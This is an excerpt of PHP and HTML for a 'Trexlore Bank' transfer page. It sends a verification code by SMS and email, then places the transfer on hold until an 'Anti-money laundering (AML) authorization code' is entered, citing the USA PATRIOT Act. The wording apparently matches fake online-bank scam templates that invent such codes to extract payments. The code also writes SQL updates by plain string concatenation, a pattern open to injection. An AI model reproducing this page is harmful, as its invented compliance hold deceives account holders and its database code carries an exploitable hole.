...
a{font-family:Calibri, Tahoma, Geneva, sans-serif;color:#FF6600;text-decoration:none;}
    ...
    <table border='0' cellpadding='0' cellspacing='0' width='689'>
      <tbody>
        ...
        <tr>
          ...
          <td colspan='9'>Bank Verification Number requesting account  information is</td>
    ...
    <tr>
        ...
        <tr>
          ...
          <td width='130'> Bank Verification Number </td>

          <td width='10'> :</td>

          <td colspan='8' width='549'> $authcode </td>
...
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
 ...
 $msg= "Dear $fetch_acc1->cust_name, Trexlore Bank Transfer alert.Your ank Verification Number for this Transaction is   $authcode . Thank you for choosing Trexlore Bank.";
balance_alert(+$countrycode,$phone,$msg);
if($authemail==1)
 {
if(mail($to,$subject,$message,$headers)){

$msg= "Bank Verification Number has been sent to your email on file ,please retrieve and enter to proceed!";
$i=1;
}
}
...
if($row['authcode']==$_POST['number'])
{
  $page=3;
   $update_bank_data = mysql_query("UPDATE transaction SET stage = '".$page."'
         WHERE id = '".$acc."'");

  $redirect="confirm_i_id.php";
 header('Location: '.$redirect);
  break;
}
else
{
  $msg="Wrong Bank Verification Number please try again";
     $i=2;
  break;
}
}}
...
?>
  ...
  <div class="breadcrumb">
    ...
    <p><strong> NOTE: Anti-money laundering (AML) authorization code is required to complete this transfer request. If for any reason the transfer is not completed, this transaction will temporally be on hold and the escrowed funds will be released back to the debited Account.
    </p>
  </div>
  <!--/row-->
      ...
      <div id="stage">
        <section class="work">
          ...
          <div class="ui-progress-bar ui-container" id="progress_bar">
            <div class="ui-progress" style="width: 65%;">
        ...
        <section class="intro" style="">
          <article>
            ...
            <p>
              The transfer is temporally suspended, please provide the Anti-money laundering (AML) as refers to a set of procedures, laws and regulations designed to stop the practice of generating income through illegal actions under section 352 of the USA PATRIOT Act.
            </p>
            <p>
            ...
            <p>
          <form action="success_page2s.php" method="post"  id="sb"><table width="70%" border="0">
  <tr>
    <td><strong>Anti-money laundering (AML)</strong></td>
    <td><span id="codetx"><input name="number" text" id="code" size="30"><span class="textfieldRequiredMsg">Bank Verification</span><span class="textfieldInvalidFormatMsg">Invalid format.</span><span class="textfieldMaxValueMsg">The entered value is greater than the maximum allowed.</span><span class="textfieldMinValueMsg">The entered value is less than the minimum required.</span><span class="textfieldMinCharsMsg">Minimum number of characters not met.</span><span class="textfieldMaxCharsMsg">Exceeded maximum number of characters.<span></span></span></span></td>
    <td>&nbsp;</td>
  </tr>
</table>
